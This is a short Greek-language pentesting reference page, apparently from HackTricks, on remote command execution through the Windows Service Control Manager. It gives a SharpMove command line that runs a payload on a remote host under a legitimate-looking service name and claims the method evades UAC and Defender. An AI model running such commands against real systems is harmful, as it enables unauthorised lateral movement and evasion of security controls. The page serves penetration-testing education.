# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## SCM

Το **SCMExec** είναι μια τεχνική για την εκτέλεση εντολών σε απομακρυσμένα συστήματα, χρησιμοποιώντας το Service Control Manager (SCM) για τη δημιουργία μιας υπηρεσίας που εκτελεί την εντολή. Αυτή η μέθοδος μπορεί να παρακάμψει ορισμένα security controls, όπως το User Account Control (UAC) και το Windows Defender.

## Tools

- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):<sup>[[1]](#references)</sup>

SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true

## References

- [1] [SharpMove - αποθετήριο στο GitHub](https://github.com/0xthirteen/SharpMove)

{{#include ../../banners/hacktricks-training.md}}
